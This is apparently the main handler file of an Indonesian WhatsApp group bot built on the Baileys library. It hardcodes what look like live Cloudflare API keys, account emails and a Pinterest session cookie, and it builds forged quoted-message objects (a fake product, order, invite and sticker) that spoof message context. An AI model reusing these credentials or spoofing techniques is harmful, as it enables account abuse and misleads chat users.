///-------------------------SIMPLE BASE-------------------------------------\\\

const
    {
        WAConnection: _WAConnection,
        MessageType,
        Presence,
        MessageOptions,
        Mimetype,
        WALocationMessage,
        WAMessageProto,
        ReconnectMode,
        ProxyAgent,
        ChatModification,
        GroupSettingChange,
        WA_MESSAGE_STUB_TYPES,
        WA_DEFAULT_EPHEMERAL,
        waChatKey,
        mentionedJid,
        processTime,
        prepareMessageFromContent,
        relayWAMessage
    } = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const hx = require('hxz-api')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const brainly = require('brainly-scraper')
const ig = require('insta-fetcher')
const cheerio = require('cheerio')
const fromData = require('form-data')
const os = require('os')
const translate = require('@vitalets/google-translate-api')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const speed = require('performance-now')
const toMs = require('ms')
const crypto = require('crypto')
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { fetchJson } = require('./lib/fetcher')
const { uploadimg, upload } = require('./lib/uploadimg')
const { webp2mp4File } = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { mediafireDl } = require('./lib/mediafire.js')
const { pinterest } = require('./lib/pinterest')
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const scrapper = require('./lib/scrapper')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const client = new WAConnection()
const dtod = "6281220670449@s.whatsapp.net"
const otod = "6281220670449@s.whatsapp.net"
// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const atm = require("./lib/atm");
const game = require("./lib/game");
const exif = new Exif()

// DATABASE
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
const antivirtex = JSON.parse(fs.readFileSync("./database/antivirtex.json"))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const yts = require('yt-search')
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
const tebakgambar = JSON.parse(fs.readFileSync('./database/game/tebakgambar.json'))
const caklontong = JSON.parse(fs.readFileSync('./database/game/caklontong.json'))
const family = JSON.parse(fs.readFileSync('./database/game/family100.json'))
const siapakahaku = JSON.parse(fs.readFileSync('./database/game/siapakahaku.json'))
const tebakkalimat = JSON.parse(fs.readFileSync('./database/game/tebakkalimat.json'))
const tebakkata = JSON.parse(fs.readFileSync('./database/game/tebakkata.json'))
const tebaklirik = JSON.parse(fs.readFileSync('./database/game/tebaklirik.json'))
const tekateki = JSON.parse(fs.readFileSync('./database/game/tekateki.json'))
const susunkata = JSON.parse(fs.readFileSync('./database/game/susunkata.json'))


let faketeks = 'Menyerahlah Dia Tidak Berharap Kamu Selalu Ada BOTZ AGIL'
const AhmadBot = {
    ahmadhost: {
        nama: 'platinumhostlive',
        cloudflare: {
            listdomain: { '1': '.newwz22.com', '2': '.terbaru21.my.id'},
            zona: { '1': 'b0fddb22a64933b0285d38d625246de2', '2': '6b44114f000b0739cf9a2edb759be108'},
            tersedia: ['1','2'],
            data: {
                email: 'sattt304@gmail.com',
                apikey: 'd514908e77de0eb077a94eecf9760b9cf9c82',
            }
        },
        ip: '20.70.8.150',
        grup: ['62895346125843-1629197295@g.us']
    },
    contoh: {
        nama: 'DIDASNESIA',
        cloudflare: {
            listdomain: { '1': '.rewardfreefire.my.id', '2': '.xnxx1947.cf', '3': '.xnxx9261.cf'},
            zona: { '1': '2e913004924f23b98903c30ade9833e0', '2': 'ec75a7907733ec127b0f96f9ec411b06', '3': 'af9fae62b064584c5c6103e81d7a7050'},
            tersedia: ['1','2','3'],
            data: {
                email: 'aldomayzacky17@gmail.com',
                apikey: '5b253c73da9340f7c14f7a139f06bb95d59ff',
            }
        },
        ip: '20.70.8.150',
        grup: ['120363023767988553@g.us']
    },
    contoh: {
        nama: 'aldo host',
        cloudflare: {
            listdomain: { '1': '.rewardfreefire.my.id'},
            zona: { '1': '2e913004924f23b98903c30ade9833e0'},
            tersedia: ['1'],
            data: {
                email: 'aldomayzacky17@gmail.com',
                apikey: '5b253c73da9340f7c14f7a139f06bb95d59ff',
            }
        },
        ip: '20.70.8.150',
        grup: ['120363042009973925@g.us']
        },
    
//Batas
}


const HBK97DG53 = {
    ahmadhost: [
    	AhmadBot.ahmadhost.grup[0],
    ],
    contoh: [
    	AhmadBot.contoh.grup[0],
    ],

//Batas
}
function BH8kj86V(id) {
    if (HBK97DG53.ahmadhost.includes(id)) return AhmadBot.ahmadhost
    if (HBK97DG53.contoh.includes(id)) return AhmadBot.contoh
    return false

//Batas
}
const BJ87V32K = [
    AhmadBot.ahmadhost.grup[0],
    AhmadBot.contoh.grup[0],

//Batas
]









ky_ttt = []
tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
cmhit = []
fake = "/> Tato PikonXCode";
autorespon = false
playmusic = false
menusimpel = false
menuall = false
baterai = {
    battery: "" || "Not detected",
    isCharge: "" || false
}
offline = false
publik = true
bugc = true
waktuafk = 'Nothing'
alasanafk = 'Nothing'
const ownerNumber = settings.ownerNumber
NamaBot = settings.NamaBot
NomorOwner = settings.NomorOwner
NomorOwner2 = settings.NomorOwner2
NamaOwner = settings.NamaOwner
multi = true
nopref = false



const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const gcount = settings.gcount

function kyun(seconds) {
    function pad(s) {
        return (s < 10 ? '0' : '') + s;
    }
    var hours = Math.floor(seconds / (60 * 60));
    var minutes = Math.floor(seconds % (60 * 60) / 60);
    var seconds = Math.floor(seconds % 60);

    //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
    return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
    var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
    var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
    var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
    return dDisplay + hDisplay + mDisplay + sDisplay;
}
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('10m') }
    afk.push(obj)
    fs.writeFileSync('./database/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./database/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}

const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
module.exports = kurr = async (kurr, mek) => {
    try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
        if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
        if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3 && bugc && !mek.key.fromMe) {
            nums = mek.participant
            longkapnye = "\n".repeat(420)
            tekuss = `\`\`\`TANDAI TELAH DIBACA !!!\`\`\`${longkapnye}\`\`\`@⁨${nums.split('@')[0]} Terdeteksi Telah Mengirim Bug, @⁨${nums.split('@')[0]} Akan Dikick!\`\`\`\n`
            kurr.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
            kurr.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, { contextInfo: { mentionedJid: [nums + "@s.whatsapp.net"] } })
        }
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const typei = Object.keys(mek.message)[0]
        global.prefix
        me = kurr.user
        m = simple.smsg(kurr, mek)
        const antibot = m.isBaileys
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const type = Object.keys(mek.message)[0]
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
        const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        kurr.on("CB:action,,battery", json => {
            const battery = json[2][0][1].value
            const persenbat = parseInt(battery)
            baterai.battery = `${persenbat}%`
            baterai.isCharge = json[2][0][1].live
        })
        if (multi) {
            var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref) {
                prefix = ''
            } else {
                prefix = prefa
            }
        }
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
        isStc = `${isStc}`
        const timestampi = speed();
        const latensyi = speed() - timestampi
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
            isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
        const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
        const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const isCmd = body.startsWith(prefix)
        const arg = budy.slice(command.length + 2, budy.length)
        const c = args.join(' ')
        var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const dfrply = fs.readFileSync('./logo.jpg')
        cmhit.push(command)
        mess = {
            wait: 'Wait a minute',
            success: 'Success',
            error: {
                stick: 'Cannot access videos!',
                Iv: 'Invalid link!',
                api: 'Error'
            },
            only: {
                group: 'Only for within the group!',
                ownerG: 'Only for group owners!',
                ownerB: 'Only for bot owners!',
                admin: 'Only for group admins!',
                Badmin: 'Make the bot a group admin!'
            }
        }
        const botNumber = kurr.user.jid
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? kurr.user.jid : isGroup ? mek.participant : mek.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const conts = mek.key.fromMe ? kurr.user.jid : kurr.contacts[mek.sender]
        const pushname = mek.key.fromMe ? kurr.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'
        const totalchat = await kurr.chats.all()
        const chat_all = await kurr.chats.all()
        const groupMetadata = isGroup ? await kurr.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupId = isGroup ? groupMetadata.jid : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const groupDesc = isGroup ? groupMetadata.desc : ''
        const groupOwner = isGroup ? groupMetadata.owner : ''
        const Depe = ["6281220679448@s.whatsapp.net"]
        const isOwner = ownerNumber.includes(sender)
        const isDev = Depe.includes(sender)
        const isNsfw = isGroup ? nsfw.includes(from) : false
        const isGroupAdmins = groupAdmins.includes(sender) || false
        const isKickArea = isGroup ? kickarea.includes(from) : false
        const isAntiWame = isGroup ? antiwame.includes(from) : false
        const isAntivirtex = isGroup ? antivirtex.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : false
        const isAuto = isGroup ? autosticker.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        membr = []
        const pff = groupMembers
        const go = groupMembers
        const goo = pff[Math.floor(Math.random() * pff.length)]
        const oe = go[Math.floor(Math.random() * go.length)]
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
        const q = args.join(' ')
        const fakegroup = (teks) => {
            kurr.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./logo.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        if (antibot === true) return
        const katalog = (teks) => {
            res = kurr.prepareMessageFromContent(from, { "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© KurrXdゑ v.3.0_*", "thumbnail": ofrply, "surface": 'CATALOG' } }, { quoted: ftrol })
            kurr.relayWAMessage(res)
        }
        const grupinv = (teks) => {
            grup = kurr.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9', "groupName": `KurrXdゑ v.3.0`, "footerText": "*_© KurrXdゑ v.3.0_*", "jpegThumbnail": ofrply, "caption": teks } }, { quoted: finv })
            kurr.relayWAMessage(grup)
        }
        idttt = []
        players1 = []
        players2 = []
        gilir = []
        for (let t of ky_ttt) {
            idttt.push(t.id)
            players1.push(t.player1)
            players2.push(t.player2)
            gilir.push(t.gilir)
        }
        const isTTT = isGroup ? idttt.includes(from) : false
        isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        try {
            pporang = await kurr.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
        } catch {
            pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
        }

        const ofrply1 = fs.readFileSync('./logo.jpg')
        const smpl = fs.readFileSync('./smpl.jpeg')
        const ofrply = await getBuffer(pporang)
        const sekarang = new Date().getTime();
        //-
        //WAKTU
        var ase = new Date();
        var jamss = ase.getHours();
        switch (jamss) {
            case 0: jamss = "Dah Malam Jangan Gadang 🌚"; break;
            case 1: jamss = "Dah Malam Jangan Gadang 🌚"; break;
            case 2: jamss = "Dah Malam Jangan Gadang 🌚"; break;
            case 3: jamss = "Dah Mau Shubuh Siap Siap Shalat Ya 🌔"; break;
            case 4: jamss = "Dah Shubuh Jangan Lupa Shalat Kak🌔"; break;
            case 5: jamss = "Pagi 🌄"; break;
            case 6: jamss = "Pagi 🌄"; break;
            case 7: jamss = "Pagi 🌄"; break;
            case 8: jamss = "Pagi ☀️"; break;
            case 9: jamss = "Pagi ☀️"; break;
            case 10: jamss = "Pagi ☀️"; break;
            case 11: jamss = "Siang 🌞"; break;
            case 12: jamss = "Udh Dzuhur  Jangan Lupa Shalat Kak 🌞"; break;
            case 13: jamss = "Siang 🌞"; break;
            case 14: jamss = "Siang 🌞"; break;
            case 15: jamss = "Dah Ashar Jangan Lupa Shalat kak🌞"; break;
            case 16: jamss = "Sore ☀️"; break;
            case 17: jamss = "Sore 🌄"; break;
            case 18: jamss = "Dah Maghrib Jangan Lupa Shalat Kak 🌄"; break;
            case 19: jamss = "Malam 🌙"; break;
            case 20: jamss = "Malam 🌙"; break;
            case 21: jamss = "Malam 🌙"; break;
            case 22: jamss = "Dah Malam Jangan Gadang 🌙"; break;
            case 23: jamss = "Dah Malam Jangan Gadang 🌚"; break;
        }
        var tampilUcapan = "" + jamss;
        const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        let d = new Date
        let locale = 'id'
        let gmt = new Date(0).getTime() - new Date('1 kurruari 2021').getTime()
        const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
        const week = d.toLocaleDateString(locale, { weekday: 'long' })
        const calender = d.toLocaleDateString(locale, {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        })
        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
        }
        if (time2 < "19:00:00") {
            var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
        }
        if (time2 < "18:00:00") {
            var imageTime = await getBuffer('https://i.pinimg.com/736x/81/08/7b/81087b2e732dc0e25d8875b135d579b9.jpg')
        }
        if (time2 < "15:00:00") {
            var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
        }
        if (time2 < "11:00:00") {
            var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
        }
        if (time2 < "06:00:00") {
            var imageTime = await getBuffer('https://i.pinimg.com/736x/15/8e/ea/158eea299c01433aae6744599d2fdc3a.jpg')
        }

        function parseMention(text = '') {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        const ftok = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
            },
            message: {
                "productMessage": {
                    "product": {
                        "productImage": {
                            "mimetype": "image/jpeg",
                            "jpegThumbnail": imageTime //Gambarnye
                        },
                        "title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
                        "description": `${tampilUcapan} ${pushname}`,
                        "currencyCode": "USD",
                        "priceAmount1000": "2000",
                        "retailerId": `${tampilUcapan} ${pushname}`,
                        "productImageCount": 1
                    },
                    "businessOwnerJid": `0@s.whatsapp.net`
                }
            }
        }
        // TROLI
        runtime = process.uptime()
        const ftrol = {
            key: {
                participant: '0@s.whatsapp.net'
            },
            message: {
                orderMessage: {
                    itemCount: 99999,
                    status: 1,
                    surface: 1,
                    message: `BOT AKTIF SELAMA : ${waktu(runtime)}`, //Kasih namalu
                    orderTitle: `KurrXdゑ v.3.0`,
                    thumbnail: ofrply1, //Gambarnye
                    sellerJid: '0@s.whatsapp.net'
                }
            }
        }

        //kick
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof (mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        // LOCATION
        const floc = {
            key: {
                participant: '0@s.whatsapp.net'
            },
            message: {
                liveLocationMessage: {
                    caption: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply
                }
            }
        }
        // DOCUMENT
        const fdoc = {
            key: {
                participant: '0@s.whatsapp.net'
            },
            message: {
                documentMessage: {
                    title: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply
                }
            }
        }
        // VIDEO
        const fvid = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ?
                    { remoteJid: "6289643739077-1613049930@g.us" } : {})
            },
            message: {
                "videoMessage": {
                    "title": `${tampilUcapan} ${pushname}`,
                    "h": `${tampilUcapan} ${pushname}`,
                    'duration': '99999',
                    'caption': `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
        }
        //pin
        const pinterest = (queryy) => {
            return new Promise((resolve, reject) => {
                axios.get(`https://id.pinterest.com/search/pins/?autologin=true&q=${queryy}`, {
                    headers: {
                        cookie: "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
                    }
                }).then(({ data }) => {
                    const $ = cheerio.load(data)
                    const result = []
                    const hasil = []
                    $('div > a').get().map(b => {
                        const link = $(b).find('img').attr('src')
                        result.push(link)
                    })
                    result.forEach(function (v) {
                        if (v == undefined) return
                        hasil.push(v.replace(/236/g, '736'))
                    })
                    hasil.shift()
                    resolve(hasil)
                }).catch(reject)
            })
        }
        // GROUPINVITE
        const finv = {
            "key": {
                "fromMe": false,
                "participant": "0@s.whatsapp.net",
                "remoteJid": "0@s.whatsapp.net"
            },
            "message": {
                "groupInviteMessage": {
                    "groupJid": "6288213840883-1616169743@g.us",
                    "inviteCode": `${tampilUcapan} ${pushname}`,
                    "groupName": `${tampilUcapan} ${pushname}`,
                    "caption": `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
        }
        // STICKER
        const fstick = {
            "key": {
                "participant": `0@s.whatsapp.net`,
                "remoteJid": "6289643739077-1613049930@g.us",
                "fromMe": false,
                "id": "3B64558B07848BD81108C1D14712018E"
            },
            "message": {
                "stickerMessage": {
                    "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
                    "pngThumbnail": dfrply,
                    "mimetype": "image/webp",
                    "height": 64,
                    "width": 64,
                    "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
                    "fileLength": "60206",
                    "firstFrameLength": 3626,
                    "isAnimated": false
                }
            },
            "messageTimestamp": "1614070775",
            "status": "PENDING"
        }
        // GIF
        const fgi = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ?
                    { remoteJid: "6289643739077-1613049930@g.us" } : {})
            },
            message: {
                "videoMessage": {
                    "title": `${tampilUcapan} ${pushname}`,
                    "h": `${tampilUcapan} ${pushname}`,
                    'duration': '99999',
                    'gifPlayback': 'true',
                    'caption': `${tampilUcapan} ${pushname}`,
                    'jpegThumbnail': dfrply
                }
            }
